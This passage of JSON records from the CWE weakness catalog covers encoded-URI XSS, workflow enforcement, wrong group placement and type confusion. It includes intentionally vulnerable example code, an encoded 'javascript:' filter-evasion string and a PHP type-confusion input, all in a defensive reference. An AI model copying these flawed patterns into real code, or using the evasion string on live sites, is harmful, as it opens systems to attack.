withdraw(double withdrawAmount) {\n\t\t\t```\n\t\t\t\t\tif (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT &&\n\t\t\t\t\twithdrawAmount > MINIMUM_WITHDRAWAL_LIMIT) {\n\t\t\t\t\t\t\t...\n```"}, {"BodyText": "Note that this example does not protect against concurrent access to the BankAccount balance variable, see CWE-413 and CWE-362."}, {"BodyText": "While it is out of scope for this example, note that the use of doubles or floats in financial calculations may be subject to certain kinds of attacks where attackers use rounding errors to steal money."}]}], "ObservedExamples": [{"Reference": "CVE-2010-1866", "Description": "Chain: integer overflow (CWE-190) causes a negative signed value, which later bypasses a maximum-only check (CWE-839), leading to heap-based buffer overflow (CWE-122).", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1866"}, {"Reference": "CVE-2009-1099", "Description": "Chain: 16-bit counter can be interpreted as a negative value, compared to a 32-bit maximum value, leading to buffer under-write.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1099"}, {"Reference": "CVE-2011-0521", "Description": "Chain: kernel's lack of a check for a negative value leads to memory corruption.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0521"}, {"Reference": "CVE-2010-3704", "Description": "Chain: parser uses atoi() but does not check for a negative value, which can happen on some platforms, leading to buffer under-write.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3704"}, {"Reference": "CVE-2010-2530", "Description": "Chain: Negative value stored in an int bypasses a size check and causes allocation of large amounts of memory.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2530"}, {"Reference": "CVE-2009-3080", "Description": "Chain: negative offset value to IOCTL bypasses check for maximum index, then used as an array index for buffer under-read.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3080"}, {"Reference": "CVE-2008-6393", "Description": "chain: file transfer client performs signed comparison, leading to integer overflow and heap-based buffer overflow.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6393"}, {"Reference": "CVE-2008-4558", "Description": "chain: negative ID in media player bypasses check for maximum index, then used as an array index for buffer under-read.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4558"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "84", "Name": "Improper Neutralization of Encoded URI Schemes in a Web Page", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The web application improperly neutralizes user-controlled input for executable script disguised with URI encodings.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "79", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Unexpected State"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Resolve all URIs to absolute or canonical representations before processing."}, {"Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended."}, {"MitigationID": "MIT-30.1", "Phase": ["Implementation"], "Strategy": "Output Encoding", "Description": "\n\nUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.\n\n\nThe problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.\n"}, {"MitigationID": "MIT-43", "Phase": ["Implementation"], "Description": "With Struts, write all data from form beans with the bean's filter attribute set to true."}, {"MitigationID": "MIT-31", "Phase": ["Implementation"], "Strategy": "Attack Surface Reduction", "Description": "To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.", "Effectiveness": "Defense in Depth"}], "ObservedExamples": [{"Reference": "CVE-2005-0563", "Description": "Cross-site scripting (XSS) vulnerability in Microsoft Outlook Web Access (OWA) component in Exchange Server 5.5 allows remote attackers to inject arbitrary web script or HTML via an email message with an encoded javascript: URL (\"jav&#X41sc&#0010;ript:\") in an IMG tag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0563"}, {"Reference": "CVE-2005-2276", "Description": "Cross-site scripting (XSS) vulnerability in Novell Groupwise WebAccess 6.5 before July 11, 2005 allows remote attackers to inject arbitrary web script or HTML via an e-mail message with an encoded javascript URI (e.g. \"j&#X41vascript\" in an IMG tag).", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2276"}, {"Reference": "CVE-2005-0692", "Description": "Encoded script within BBcode IMG tag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0692"}, {"Reference": "CVE-2002-0117", "Description": "Encoded \"javascript\" in IMG tag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0117"}, {"Reference": "CVE-2002-0118", "Description": "Encoded \"javascript\" in IMG tag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0118"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-40181", "Description": "A vulnerability has been identified in Desigo PXM30-1 (All versions < V02.20.126.11-41), Desigo PXM30.E (All versions < V02.20.126.11-41), Desigo PXM40-1 (All versions < V02.20.126.11-41), Desigo PXM40.E (All versions < V02.20.126.11-41), Desigo PXM50-1 (All versions < V02.20.126.11-41), Desigo PXM50.E (All versions < V02.20.126.11-41), PXG3.W100-1 (All versions < V02.20.126.11-37), PXG3.W100-2 (All versions < V02.20.126.11-41), PXG3.W200-1 (All versions < V02.20.126.11-37), PXG3.W200-2 (All versions < V02.20.126.11-41). The device embedded browser does not prevent interaction with alternative URI schemes when redirected to corresponding resources by web application code. By setting the homepage URI, the favorite URIs, or redirecting embedded browser users via JavaScript code to alternative scheme resources, a remote low privileged attacker can perform a range of attacks against the device, such as read arbitrary files on the filesystem, execute arbitrary JavaScript code in order to steal or manipulate the information on the screen, or trigger denial of service conditions."}]}
{"ID": "841", "Name": "Improper Enforcement of Behavioral Workflow", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.", "ExtendedDescription": "\n\nBy performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the product or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.\n\n\nFor example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the product might still perform the transfer.\n\n\nNote that this is different than CWE-696, which focuses on when the product performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence.\n\n\nWorkflow-related behaviors include:\n\n\n  - Steps are performed in the expected order.\n\n  - Required steps are not omitted.\n\n  - Steps are not interrupted.\n\n  - Steps are performed in a timely fashion.\n\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "691", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Alter Execution Logic"], "Note": "An attacker could cause the product to skip critical steps or perform them in the wrong order, bypassing its intended business logic. This can sometimes have security implications."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This code is part of an FTP server and deals with various commands that could be sent by a user. It is intended that a user must successfully login before performing any other action such as retrieving or listing files."}, {"Nature": "Bad", "Language": "Python", "ExampleCode": "```\n\tdef dispatchCommand(command, user, args):\n\t\t\tif command == 'Login':\n\t\t\t\tloginUser(args)\n\t\t\t\treturn\n```\n# user has requested a file* \n\t\t\tif command == 'Retrieve_file': \n\t\t\t```\n\t\t\t\t if authenticated(user) and ownsFile(user,args): \n\t\t\t\t\tsendFile(args)\n\t\t\t\t\treturn\n\t\t\tif command == 'List_files':\n\t\t\t\tlistFiles(args)\n\t\t\t\treturn\n```\n...*"}, {"BodyText": "The server correctly avoids sending files to a user that isn't logged in and doesn't own the file. However, the server will incorrectly list the files in any directory without confirming the command came from an authenticated user, and that the user is authorized to see the directory's contents."}, {"BodyText": "Here is a fixed version of the above example:"}, {"Nature": "Good", "Language": "Python", "ExampleCode": "```\n\tdef dispatchCommand(command, user, args):\n```\n...* \n\t\t\tif command == 'List_files':\n\t\t\t```\n\t\t\t\tif authenticated(user) and ownsDirectory(user,args):\n\t\t\t\t\tlistFiles(args)\n\t\t\t\t\treturn\n```\n...*"}]}], "ObservedExamples": [{"Reference": "CVE-2011-0348", "Description": "Bypass of access/billing restrictions by sending traffic to an unrestricted destination before sending to a restricted destination.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0348"}, {"Reference": "CVE-2007-3012", "Description": "Attacker can access portions of a restricted page by canceling out of a dialog.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3012"}, {"Reference": "CVE-2009-5056", "Description": "Ticket-tracking system does not enforce a permission setting.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-5056"}, {"Reference": "CVE-2004-2164", "Description": "Shopping cart does not close a database connection when user restores a previous order, leading to connection exhaustion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2164"}, {"Reference": "CVE-2003-0777", "Description": "Chain: product does not properly handle dropped connections, leading to missing NULL terminator (CWE-170) and segmentation fault.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0777"}, {"Reference": "CVE-2005-3327", "Description": "Chain: Authentication bypass by skipping the first startup step as required by the protocol.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3327"}, {"Reference": "CVE-2004-0829", "Description": "Chain: File server crashes when sent a \"find next\" request without an initial \"find first.\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0829"}, {"Reference": "CVE-2010-2620", "Description": "FTP server allows remote attackers to bypass authentication by sending (1) LIST, (2) RETR, (3) STOR, or other commands without performing the required login steps first.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2620"}, {"Reference": "CVE-2005-3296", "Description": "FTP server allows remote attackers to list arbitrary directories as root by running the LIST command before logging in.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3296"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Research Gap", "Note": "\n\nThis weakness is typically associated with business logic flaws, except when it produces resultant weaknesses.\n\n\nThe classification of business logic flaws has been under-studied, although exploitation of business flaws frequently happens in real-world systems, and many applied vulnerability researchers investigate them. The greatest focus is in web applications. There is debate within the community about whether these problems represent particularly new concepts, or if they are variations of well-known principles.\n\n\nMany business logic flaws appear to be oriented toward business processes, application flows, and sequences of behaviors, which are not as well-represented in CWE as weaknesses related to input validation, memory management, etc.\n"}]}
{"ID": "842", "Name": "Placement of User into Incorrect Group", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product or the administrator places a user into an incorrect group.", "ExtendedDescription": "If the incorrect group has more access or privileges than the intended group, the user might be able to bypass intended security policy to access unexpected resources or perform unexpected actions. The access-control system might not be able to detect malicious usage of this group membership.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "286", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"]}], "ObservedExamples": [{"Reference": "CVE-1999-1193", "Description": "Operating system assigns user to privileged wheel group, allowing the user to gain root privileges.", "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1193"}, {"Reference": "CVE-2010-3716", "Description": "Chain: drafted web request allows the creation of users with arbitrary group membership.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3716"}, {"Reference": "CVE-2008-5397", "Description": "Chain: improper processing of configuration options causes users to contain unintended group memberships.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5397"}, {"Reference": "CVE-2007-6644", "Description": "CMS does not prevent remote administrators from promoting other users to the administrator group, in violation of the intended security model.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6644"}, {"Reference": "CVE-2007-3260", "Description": "Product assigns members to the root group, allowing escalation of privileges.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3260"}, {"Reference": "CVE-2002-0080", "Description": "Chain: daemon does not properly clear groups before dropping privileges.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0080"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-45097", "Description": " Dell PowerScale OneFS 9.0.0.x-9.4.0.x contains an Incorrect User Management vulnerability. A low privileged network attacker could potentially exploit this vulnerability, leading to escalation of privileges, and information disclosure. "}]}
{"ID": "843", "Name": "Access of Resource Using Incompatible Type ('Type Confusion')", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type.", "ExtendedDescription": "\n\nWhen the product accesses the resource using an incompatible type, this could trigger logical errors because the resource does not have expected properties. In languages without memory safety, such as C and C++, type confusion can lead to out-of-bounds memory access.\n\n\nWhile this weakness is frequently associated with unions when parsing data with many different embedded object types in C, it can be present in any application that can interpret the same variable or memory location in multiple ways.\n\n\nThis weakness is not unique to C and C++. For example, errors in PHP applications can be triggered by providing array parameters when scalars are expected, or vice versa. Languages such as Perl, which perform automatic conversion of a variable of one type when it is accessed as if it were another type, can also contain these issues.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "704", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "704", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "119", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "Object Type Confusion"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Availability", "Integrity", "Confidentiality"], "Impact": ["Read Memory", "Modify Memory", "Execute Unauthorized Code or Commands", "DoS: Crash, Exit, or Restart"], "Note": "When a memory buffer is accessed using the wrong type, it could read or write memory out of the bounds of the buffer, if the allocated buffer is smaller than the type that the code is attempting to access, leading to a crash and possibly code execution."}], "DemonstrativeExamples": [{"ID": "DX-188", "Entries": [{"IntroText": "The following code uses a union to support the representation of different types of messages. It formats messages differently, depending on their type."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\t#define NAME_TYPE 1\n\t#define ID_TYPE 2\n\tstruct MessageBuffer\n\t{\n\t\tint msgType;\n\t\tunion {\n\t\t\tchar *name;\n\t\t\tint nameID;\n\t\t};\n\t};\n\tint main (int argc, char **argv) {\n\t\t\tstruct MessageBuffer buf;\n\t\t\tchar *defaultMessage = \"Hello World\";\n\t\t\tbuf.msgType = NAME_TYPE;\n\t\t\tbuf.name = defaultMessage;\n\t\t\tprintf(\"Pointer of buf.name is %p\\n\", buf.name);\n```\n/* This particular value for nameID is used to make the code architecture-independent. If coming from untrusted input, it could be any value. */* \n\t\t\t\n\t\t\tbuf.nameID = (int)(defaultMessage + 1);\n\t\t\tprintf(\"Pointer of buf.name is now %p\\n\", buf.name);\n\t\t\tif (buf.msgType == NAME_TYPE) {\n\t\t\t```\n\t\t\t\tprintf(\"Message: %s\\n\", buf.name);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprintf(\"Message: Use ID %d\\n\", buf.nameID);\n\t\t\t}\n\t}\n```"}, {"BodyText": "The code intends to process the message as a NAME_TYPE, and sets the default message to \"Hello World.\" However, since both buf.name and buf.nameID are part of the same union, they can act as aliases for the same memory location, depending on memory layout after compilation."}, {"BodyText": "As a result, modification of buf.nameID - an int - can effectively modify the pointer that is stored in buf.name - a string."}, {"BodyText": "Execution of the program might generate output such as:"}, {"BodyText": "```\n\t\tPointer of name is 10830\n\t\tPointer of name is now 10831\n\t\tMessage: ello World\n```"}, {"BodyText": "Notice how the pointer for buf.name was changed, even though buf.name was not explicitly modified."}, {"BodyText": "In this case, the first \"H\" character of the message is omitted. However, if an attacker is able to fully control the value of buf.nameID, then buf.name could contain an arbitrary pointer, leading to out-of-bounds reads or writes."}]}, {"Entries": [{"IntroText": "The following PHP code accepts a value, adds 5, and prints the sum."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t$value = $_GET['value'];\n\t$sum = $value + 5;\n\techo \"value parameter is '$value'<p>\";\n\techo \"SUM is $sum\";\n```"}, {"BodyText": "When called with the following query string:"}, {"BodyText": "```\n\t\tvalue=123\n```"}, {"BodyText": "the program calculates the sum and prints out:"}, {"BodyText": "```\n\t\tSUM is 128\n```"}, {"BodyText": "However, the attacker could supply a query string such as:"}, {"BodyText": "```\n\t\tvalue[]=123\n```"}, {"BodyText": "The \"[]\" array syntax causes $value to be treated as an array type, which then generates a fatal error when calculating $sum:"}, {"BodyText": "```\n\t\tFatal error: Unsupported operand types in program.php on line 2\n```"}]}, {"Entries": [{"IntroText": "The following Perl code is intended to look up the privileges for user ID's between 0 and 3, by performing an access of the $UserPrivilegeArray reference. It is expected that only userID 3 is an admin (since this is listed in the third element of the array)."}, {"Nature": "Bad", "Language": "Perl", "ExampleCode": "```\n\tmy $UserPrivilegeArray = [\"user\", \"user\", \"admin\", \"user\"];\n\tmy $userID = get_current_user_ID();\n\tif ($UserPrivilegeArray eq \"user\") {\n\t\tprint \"Regular user!\\n\";\n\t}\n\telse {\n\t\tprint \"Admin!\\n\";\n\t}\n\tprint \"\\$UserPrivilegeArray = $UserPrivilegeArray\\n\";\n```"}, {"BodyText": "In this case, the programmer intended to use \"$UserPrivilegeArray->{$userID}\" to access the proper position in the array. But because the subscript was omitted, the \"user\" string was compared to the scalar representation of the $UserPrivilegeArray reference, which might be of the form \"ARRAY(0x229e8)\" or similar."}, {"BodyText": "Since the logic also \"fails open\" (CWE-636), the result of this bug is that all users are assigned administrator privileges."}, {"BodyText": "While this is a forced example, it demonstrates how type confusion can have security consequences, even in memory-safe languages."}]}], "ObservedExamples": [{"Reference": "CVE-2010-4577", "Description": "Type confusion in CSS sequence leads to out-of-bounds read.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4577"}, {"Reference": "CVE-2011-0611", "Description": "Size inconsistency allows code execution, first discovered when it was actively exploited in-the-wild.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0611"}, {"Reference": "CVE-2010-0258", "Description": "Improperly-parsed file containing records of different types leads to code execution when a memory location is interpreted as a different object than intended.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-0258"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Applicable Platform", "Note": "\n\nThis weakness is possible in any type-unsafe programming language.\n"}, {"Type": "Research Gap", "Note": "\n\nType confusion weaknesses have received some attention by applied researchers and major software vendors for C and C++ code. Some publicly-reported vulnerabilities probably have type confusion as a root-cause weakness, but these may be described as \"memory corruption\" instead.\n\n\nFor other languages, there are very few public reports of type confusion weaknesses. These are probably under-studied. Since many programs rely directly or indirectly on loose typing, a potential \"type confusion\" behavior might be intentional, possibly requiring more manual analysis.\n"}], "Top25Examples": [{"Reference": "CVE-2021-26635", "Description": "In the code that verifies the file size in the ark library, it is possible to manipulate the offset read from the target file due to the wrong use of the data type. An attacker could use this vulnerability to cause a stack buffer overflow and as a result, perform an attack such as remote code execution."}, {"Reference": "CVE-2021-38007", "Description": "Type confusion in V8 in Google Chrome prior to 96.0.4664.45 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2021-38012", "Description": "Type confusion in V8 in Google Chrome prior to 96.0.4664.45 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2021-4056", "Description": "Type confusion in loader in Google Chrome prior to 96.0.4664.93 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2021-4061", "Description": "Type confusion in V8 in Google Chrome prior to 96.0.4664.93 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2021-4078", "Description": "Type confusion in V8 in Google Chrome prior to 96.0.4664.93 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-0102", "Description": "Type confusion in V8 in Google Chrome prior to 97.0.4692.71 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-0457", "Description": "Type confusion in V8 in Google Chrome prior to 98.0.4758.80 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-0795", "Description": "Type confusion in Blink Layout in Google Chrome prior to 99.0.4844.51 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-1096", "Description": "Type confusion in V8 in Google Chrome prior to 99.0.4844.84 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-1134", "Description": "Type confusion in V8 in Google Chrome prior to 100.0.4896.60 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-1232", "Description": "Type confusion in V8 in Google Chrome prior to 100.0.4896.75 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-1314", "Description": "Type confusion in V8 in Google Chrome prior to 100.0.4896.88 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-1364", "Description": "Type confusion in V8 Turbofan in Google Chrome prior to 100.0.4896.127 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-1869", "Description": "Type Confusion in V8 in Google Chrome prior to 102.0.5005.61 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-20461", "Description": "In pinReplyNative of com_android_bluetooth_btservice_AdapterService.cpp, there is a possible out of bounds read due to type confusion. This could lead to local escalation of privilege of BLE with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12L Android-13Android ID: A-228602963"}, {"Reference": "CVE-2022-26433", "Description": "In mailbox, there is a possible out of bounds write due to type confusion. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07138400; Issue ID: ALPS07138400."}, {"Reference": "CVE-2022-3315", "Description": "Type confusion in Blink in Google Chrome prior to 106.0.5249.62 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: Low)"}, {"Reference": "CVE-2022-3889", "Description": "Type confusion in V8 in Google Chrome prior to 107.0.5304.106 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)"}, {"Reference": "CVE-2022-4174", "Description": "Type confusion in V8 in Google Chrome prior to 108.0.5359.71 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)"}, {"Reference": "CVE-2022-25721", "Description": "Memory corruption in video driver due to type confusion error during video playback"}, {"Reference": "CVE-2022-2295", "Description": "Type confusion in V8 in Google Chrome prior to 103.0.5060.114 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2022-34918", "Description": "An issue was discovered in the Linux kernel through 5.18.9. A type confusion bug in nft_set_elem_init (leading to a buffer overflow) could be used by a local attacker to escalate privileges, a different vulnerability than CVE-2022-32250. (The attacker can obtain root access, but must start with an unprivileged user namespace to obtain CAP_NET_ADMIN access.) This can be fixed in nft_setelem_parse_data in net/netfilter/nf_tables_api.c."}, {"Reference": "CVE-2022-3652", "Description": "Type confusion in V8 in Google Chrome prior to 107.0.5304.62 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)"}, {"Reference": "CVE-2022-23583", "Description": "Tensorflow is an Open Source Machine Learning Framework. A malicious user can cause a denial of service by altering a `SavedModel` such that any binary op would trigger `CHECK` failures. This occurs when the protobuf part corresponding to the tensor arguments is modified such that the `dtype` no longer matches the `dtype` expected by the op. In that case, calling the templated binary operator for the binary op would receive corrupted data, due to the type confusion involved. If `Tin` and `Tout` don't match the type of data in `out` and `input_*` tensors then `flat<*>` would interpret it wrongly. In most cases, this would be a silent failure, but we have noticed scenarios where this results in a `CHECK` crash, hence a denial of service. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range."}, {"Reference": "CVE-2022-3723", "Description": "Type confusion in V8 in Google Chrome prior to 107.0.5304.87 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)"}, {"Reference": "CVE-2022-4262", "Description": "Type confusion in V8 in Google Chrome prior to 108.0.5359.94 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)"}, {"Reference": "CVE-2021-1789", "Description": "A type confusion issue was addressed with improved state handling. This issue is fixed in macOS Big Sur 11.2, Security Update 2021-001 Catalina, Security Update 2021-001 Mojave, tvOS 14.4, watchOS 7.3, iOS 14.4 and iPadOS 14.4, Safari 14.0.3. Processing maliciously crafted web content may lead to arbitrary code execution."}, {"Reference": "CVE-2021-21224", "Description": "Type confusion in V8 in Google Chrome prior to 90.0.4430.85 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page."}, {"Reference": "CVE-2021-30551", "Description": "Type confusion in V8 in Google Chrome prior to 91.0.4472.101 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2021-30563", "Description": "Type Confusion in V8 in Google Chrome prior to 91.0.4472.164 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page."}, {"Reference": "CVE-2021-30869", "Description": "A type confusion issue was addressed with improved state handling. This issue is fixed in iOS 12.5.5, iOS 14.4 and iPadOS 14.4, macOS Big Sur 11.2, Security Update 2021-001 Catalina, Security Update 2021-001 Mojave, Security Update 2021-006 Catalina. A malicious application may be able to execute arbitrary code with kernel privileges. Apple is aware of reports that an exploit for this issue exists in the wild."}, {"Reference": "CVE-2022-41033", "Description": "Windows COM+ Event System Service Elevation of Privilege Vulnerability"}, {"Reference": "CVE-2022-42856", "Description": "A type confusion issue was addressed with improved state handling. This issue is fixed in Safari 16.2, tvOS 16.2, macOS Ventura 13.1, iOS 15.7.2 and iPadOS 15.7.2, iOS 16.1.2. Processing maliciously crafted web content may lead to arbitrary code execution. Apple is aware of a report that this issue may have been actively exploited against versions of iOS released before iOS 15.1.."}, {"Reference": "CVE-2022-21656", "Description": "Envoy is an open source edge and service proxy, designed for cloud-native applications. The default_validator.cc implementation used to implement the default certificate validation routines has a \"type confusion\" bug when processing subjectAltNames. This processing allows, for example, an rfc822Name or uniformResourceIndicator to be authenticated as a domain name. This confusion allows for the bypassing of nameConstraints, as processed by the underlying OpenSSL/BoringSSL implementation, exposing the possibility of impersonation of arbitrary servers. As a result Envoy will trust upstream certificates that should not be trusted."}, {"Reference": "CVE-2022-21772", "Description": "In TEEI driver, there is a possible type confusion due to a race condition. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06493842; Issue ID: ALPS06493842."}, {"Reference": "CVE-2021-33624", "Description": "In kernel/bpf/verifier.c in the Linux kernel before 